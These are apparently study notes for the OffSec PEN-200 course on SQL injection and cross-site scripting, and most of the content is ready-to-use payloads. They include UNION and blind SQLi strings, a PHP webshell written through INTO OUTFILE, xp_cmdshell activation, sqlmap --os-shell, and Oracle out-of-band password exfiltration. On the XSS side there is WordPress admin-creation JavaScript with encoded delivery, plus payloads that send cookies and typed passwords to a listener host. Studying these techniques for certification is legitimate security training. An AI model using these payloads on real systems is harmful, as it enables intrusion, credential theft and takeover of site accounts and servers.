# Web — Injection Attacks (SQL Injection · Cross-Site Scripting)

- Modules: PEN-200 / **Module 10 — SQL Injection Attacks** (§10.1–10.4) + **Module 8 §8.4 — Cross-Site Scripting**
- URLs: https://portal.offsec.com/courses/pen-200-44065/learning/sql-injection-attacks-44770 · https://portal.offsec.com/courses/pen-200-44065/learning/introduction-to-web-application-attacks-44516
- Code/command blocks: ~40

> Terminal output is omitted; only commands, queries & payloads are captured.
> Placeholders (BoxHelper.html): `{{TARGET_IP}}` target host, `{{URL}}` full base URL, `{{USERNAME}}`/`{{PASSWORD}}` DB creds, `{{LHOST}}`/`{{LPORT}}` your listener.

> **⚡ Quick jump:**
> **SQLi** — [10.1 DB connect/enum](#101--sql-theory-and-databases) · [10.2.1 Error-based](#1021-identifying-sqli-via-error-based-payloads) · [10.2.2 UNION](#1022-union-based-payloads) · [10.2.3 Blind](#1023-blind-sql-injections) · [10.3.1 Manual RCE](#1031-manual-code-execution) · [10.3.2 sqlmap (exam-banned)](#1032-automating-the-attack--sqlmap) · [PortSwigger SQLi](#portswigger--sqli-cheat-sheet)
> **XSS** — [8.4 theory](#84--cross-site-scripting) · [8.4.4 Basic XSS](#844-basic-xss) · [8.4.5 PrivEsc via XSS](#845-privilege-escalation-via-xss) · [PortSwigger XSS](#portswigger--xss-cheat-sheet)

---

# PART A — SQL Injection (Module 10)

# 10.1 — SQL Theory and Databases

> SQLi lets you meddle with the query the app sends the DB, extending it to reach data (or the OS) you shouldn't. Vulnerable pattern: user input concatenated straight into the query string (`"... WHERE user_name='$uname' AND password='$passwd'"`). Syntax varies by engine — the big two below are MySQL/MariaDB and MSSQL.

## 10.1.1 / 10.1.2 Connecting & fingerprinting DBs

**MySQL** (default port 3306):

```bash
mysql -u {{USERNAME}} -p'{{PASSWORD}}' -h {{TARGET_IP}} -P 3306 --skip-ssl-verify-server-cert
# append --skip-ssl if you hit "ERROR 2026 (HY000) TLS/SSL error"
```

```sql
select version();            -- server version
select system_user();        -- current user@host
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';   -- dump a hash
```

**MSSQL** via Impacket (TDS protocol; `-windows-auth` forces NTLM):

```bash
impacket-mssqlclient {{USERNAME}}:{{PASSWORD}}@{{TARGET_IP}} -windows-auth
```

```sql
SELECT @@version;                                   -- OS + SQL version
SELECT name FROM sys.databases;                     -- list DBs
SELECT * FROM offsec.information_schema.tables;      -- tables in the 'offsec' DB
SELECT * FROM offsec.dbo.users;                      -- read a table (db.schema.table)
```

> MySQL accepts `version()` and `@@version`. With `sqlcmd` you must end statements with `;` then `GO` on its own line; over Impacket/TDS you can omit `GO`.

---

# 10.2 — Manual SQL Exploitation

> Learn manual SQLi cold — it's the exam path (sqlmap is banned, see §10.3.2). Comment syntax to truncate the rest of the query: `-- ` (two dashes + space) or `#` (MySQL). The course trails comments with `// ` for visibility and whitespace protection: `-- //`.

## 10.2.1 Identifying SQLi via error-based payloads

> First probe with a single quote `'` to force a syntax error (confirms interaction). Then bypass auth with an always-true `OR`, and extract data with a subquery whose result gets echoed back in the error (in-band). Query one column at a time; add a `WHERE` to target a specific row.

```sql
'                                                     -- break the query -> SQL error = injectable
offsec' OR 1=1 -- //                                  -- auth bypass (returns first user)

' or 1=1 in (select @@version) -- //                  -- leak DB version via error
' or 1=1 in (SELECT password FROM users) -- //        -- leak all password hashes
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //   -- one user
```

## 10.2.2 UNION-based payloads

> When the query's results are rendered, `UNION SELECT` appends your own result set. Two rules: **same column count** and **compatible types**. Find the count with `ORDER BY N` (increment until error) or `UNION SELECT NULL,NULL,...`. Then find which columns display, avoiding the integer id column (usually column 1).

```sql
' ORDER BY 1-- //                                     -- increment N until it errors => column count
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //         -- which columns render?

-- enumerate current db/user/version (put strings in string-typed columns)
' UNION SELECT null, null, database(), user(), @@version -- //

-- list tables/columns of the current database
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

-- dump the discovered users table
' UNION SELECT null, username, password, description, null FROM users -- //
```

## 10.2.3 Blind SQL injections

> No query output returned — infer via **boolean** (page differs on TRUE/FALSE) or **time** (DB sleeps on TRUE). Probe a known-good vs known-bad value to learn the app's two responses.

```sql
-- boolean-based (page content differs when the AND clause is true)
{{URL}}/blindsqli.php?user=offsec' AND 1=1 -- //

-- time-based (page hangs ~3s when true)
{{URL}}/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

---

# 10.3 — Manual and Automated Code Execution

## 10.3.1 Manual code execution

> **MSSQL → `xp_cmdshell`**: disabled by default; enable via `sp_configure` (needs `show advanced options`), then `EXECUTE` shell commands. **MySQL → `INTO OUTFILE`**: no single RCE function, but write a PHP webshell into the web root (dir must be writable by the DB OS user).

MSSQL — enable and use `xp_cmdshell`:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

MySQL — write a webshell to disk via a UNION payload, then hit it:

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

```bash
curl "{{URL}}/tmp/webshell.php?cmd=id"                 # confirm RCE (runs as www-data)
```

## 10.3.2 Automating the attack — sqlmap

> ⚠️ **SKIPPED for exam — `sqlmap` is a banned automatic-exploitation tool on the OSCP exam.** Use it freely in the labs/PWK to save time, but the **manual** methods (§10.2 / §10.3.1) are what you must rely on in the exam. Compact reference for lab use only:

```bash
# detect (-p = param to test); press Enter through prompts
sqlmap -u "{{URL}}/blindsqli.php?user=1" -p user

# dump data
sqlmap -u "{{URL}}/blindsqli.php?user=1" -p user --dump

# from a saved Burp request (POST) + interactive OS shell into a writable web dir
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

# common extras
sqlmap -u "{{URL}}?id=1" --dbs                          # list databases
sqlmap -u "{{URL}}?id=1" -D offsec --tables             # tables in a DB
sqlmap -u "{{URL}}?id=1" -D offsec -T users --dump      # dump a table
sqlmap -u "{{URL}}?id=1" --batch --level=5 --risk=3     # non-interactive, deeper tests
```

> sqlmap is loud (no stealth) and, again, **exam-prohibited** — don't build a reflex around it. Also note `sqlninja` (MSSQL auto-exploit) is likewise a banned automatic tool — skip it.

---

# PortSwigger — SQLi Cheat Sheet

> Cross-engine syntax and blind techniques from the PortSwigger Web Security Academy. https://portswigger.net/web-security/sql-injection · [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Version / current-user / comments by engine:**

| | Version | Current user | Comment | String concat |
|---|---|---|---|---|
| MySQL | `@@version` | `user()` | `-- ` , `#` | `CONCAT(a,b)` (no `||` by default) |
| MSSQL | `@@version` | `SYSTEM_USER` | `-- ` , `/*..*/` | `a+b` |
| PostgreSQL | `version()` | `current_user` | `-- ` | `a\|\|b` |
| Oracle | `SELECT banner FROM v$version` | `USER` (`FROM dual`) | `-- ` | `a\|\|b` |

> **Oracle quirk:** every `SELECT` needs a `FROM` — use `FROM dual` (e.g. `' UNION SELECT NULL FROM dual-- `). List tables/cols with `all_tables` / `all_tab_columns` (Oracle) vs `information_schema.tables` / `.columns` (others).

**UNION — retrieve multiple values in one column** (when only one column is string-typed), using engine concat:

```sql
' UNION SELECT NULL,username||'~'||password FROM users-- -           -- Oracle/Postgres
' UNION SELECT NULL,concat(username,'~',password) FROM users-- -     -- MySQL
```

**Blind — extract data character-by-character:**

```sql
-- conditional response (boolean)
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'-- -

-- conditional error (when only errors are observable) — MSSQL/Oracle style
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)=0-- -             -- generic
' AND (SELECT CASE WHEN (condition) THEN to_char(1/0) ELSE '' END FROM dual) IS NULL-- -  -- Oracle

-- time delays (per engine)
'; IF (condition) WAITFOR DELAY '0:0:5'-- -                          -- MSSQL
' AND (SELECT sleep(5) FROM dual WHERE condition)-- -                -- MySQL
'|| (SELECT CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -  -- PostgreSQL
' AND 1=(SELECT CASE WHEN condition THEN dbms_pipe.receive_message(('a'),5) ...)-- -  -- Oracle

-- out-of-band (OAST) exfil when nothing is reflected/timed (Oracle example)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.BURP-COLLAB/">%r;]>'),'/l') FROM dual-- -
```

**Other contexts / filter bypass:** injection can be in `WHERE`, `ORDER BY` (no quotes — `1,(SELECT CASE WHEN ...)`), `INSERT`, `UPDATE`, or the `Cookie`/`User-Agent`/`Referer` headers. **Second-order**: input stored now, unsafely reused in a later query. Bypass filters with case/comments (`SeLeCT`, `SEL/**/ECT`), URL/double-URL encoding, or SQL-hex/`CHAR()`.

---

# PART B — Cross-Site Scripting (Module 8 §8.4)

# 8.4 — Cross-Site Scripting

> XSS injects client-side script that runs in a victim's browser under the site's origin. Root cause: unsanitised input reflected into output. Impact: session/cookie theft, forced actions as the victim, redirects, defacement.

## 8.4.1 Stored vs Reflected (vs DOM) theory

- **Stored / Persistent** — payload saved server-side (DB/cache) and served to every viewer. Lives in comments, reviews, forum posts, log-viewer fields. Hits all users.
- **Reflected** — payload echoed straight back from the request (search box, error message). Delivered via a crafted link; hits only whoever follows it.
- **DOM-based** — client-side JS writes a user-controlled value into a dangerous sink; the payload never needs to reach the server (see PortSwigger sources/sinks below).

## 8.4.2 / 8.4.3 Identifying XSS

> Feed special characters into every input reflected as output and see which come back unfiltered:

```text
< > ' " { } ;
```

> `< >` build HTML tags, `{ }` JS blocks, `' "` strings, `;` statement ends. If they survive un-encoded (not turned into `&lt;` etc.), the context is likely injectable. The payload set depends on context: between tags you need `<script>`/`<img>`; inside an existing attribute or `<script>` you only need quotes/`;` to break out. Test JS quickly in the browser console (`about:blank`):

```javascript
function multiplyValues(x,y){ return x * y; }
console.log(multiplyValues(3,5));
```

## 8.4.4 Basic XSS

> Confirm with a harmless `alert`. Stored example: a plugin logs the `User-Agent` and renders it unsanitised in a `<td>`, so a `User-Agent` script tag executes when an admin views the log.

```html
<script>alert(42)</script>
```

> In Burp Repeater, replace the request's `User-Agent` with the payload and send; a `200 OK` means it's stored. It fires when the admin loads the page rendering that field.

## 8.4.5 Privilege Escalation via XSS

> Escalate beyond `alert`. WordPress session cookies use **HttpOnly** (JS can't read them) — so instead of stealing cookies, make the admin's browser **create a new admin account**. WordPress guards actions with a CSRF **nonce**, but our JS runs *in the admin's session*, so it can fetch the nonce first, then POST the user-create with it.

Step 1 — fetch the nonce from the user-create page:

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

Step 2 — POST a new administrator using that nonce:

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

> Delivery: **minify** the JS (e.g. JSCompress), then **encode** it so bad chars don't break the header, and wrap in `eval(String.fromCharCode(...))` inside `<script>` tags.

Encoder (run in browser console, paste the minified JS):

```javascript
function encode_to_javascript(string){
  var input = string; var output = '';
  for(pos = 0; pos < input.length; pos++){
    output += input.charCodeAt(pos);
    if(pos != (input.length - 1)){ output += ","; }
  }
  return output;
}
let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
```

Deliver the stored payload via the `User-Agent` header with curl (proxy through Burp to inspect):

```bash
curl -i {{URL}} --user-agent "<script>eval(String.fromCharCode(<ENCODED_INTS>))</script>" --proxy 127.0.0.1:8080
```

> When the admin loads the plugin page, the script runs in their session and the new `attacker` admin appears under **Users**. Next step (own the host): upload a WordPress plugin containing a webshell → reverse shell.

---

# PortSwigger — XSS Cheat Sheet

> Contexts, sinks and payloads from the PortSwigger Web Security Academy. https://portswigger.net/web-security/cross-site-scripting · [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

**Payloads that don't need `<script>`** (filters often block `script`):

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">x</a>
```

**Breaking out by context:**

```html
<!-- between tags: inject your own tag -->
"><svg onload=alert(1)>

<!-- inside an attribute value: close it, add an event handler -->
" onmouseover="alert(1)                 <!-- or -->  "><img src=x onerror=alert(1)>

<!-- inside an existing <script> string: close the string/tag -->
'-alert(1)-'
</script><svg onload=alert(1)>
```

**DOM-based — dangerous sinks & sources.** Source (attacker-controlled): `location`, `location.hash/search`, `document.URL`, `document.referrer`, `window.name`, `postMessage`. Sink (executes/writes): `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src`, jQuery `$()`/`.html()`. Trace source→sink to confirm.

**Weaponised payloads:**

```html
<!-- exfiltrate cookies (only if not HttpOnly) -->
<script>new Image().src='http://{{LHOST}}/c?'+document.cookie</script>
<script>fetch('http://{{LHOST}}/c?'+encodeURIComponent(document.cookie))</script>

<!-- steal auto-filled credentials from a password field -->
<input name=username id=username>
<input type=password name=password onchange="fetch('http://{{LHOST}}/?'+this.value)">

<!-- force a state-changing request as the victim (XSS-driven CSRF) -->
<script>fetch('/account/email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com'})</script>
```

> **Methodology:** inject a unique marker (e.g. `zzqq1`), find every place it reflects, and identify each context (HTML text / attribute / JS / URL). Try a context-appropriate breakout, then a non-`script` handler if `<script>` is filtered. **Polyglot** for spraying many contexts at once:

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarea/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

# Wrapping Up

SQLi: fingerprint the engine, confirm with `'`, then exploit **manually** (error-based → UNION → blind) and escalate to RCE (`xp_cmdshell` on MSSQL, `INTO OUTFILE` webshell on MySQL). **sqlmap/sqlninja are banned on the exam** — lab-only. XSS: find unsanitised reflection, break out of its context, and weaponise (stored admin-creation, cookie/credential theft, XSS-driven CSRF). Both are OWASP-Top-10 injection classes and stem from the same root cause — untrusted input reaching an interpreter unescaped. See [enumeration.md](enumeration.md) to find these inputs and [directories-and-files.md](directories-and-files.md) for the file/command-path attack classes.
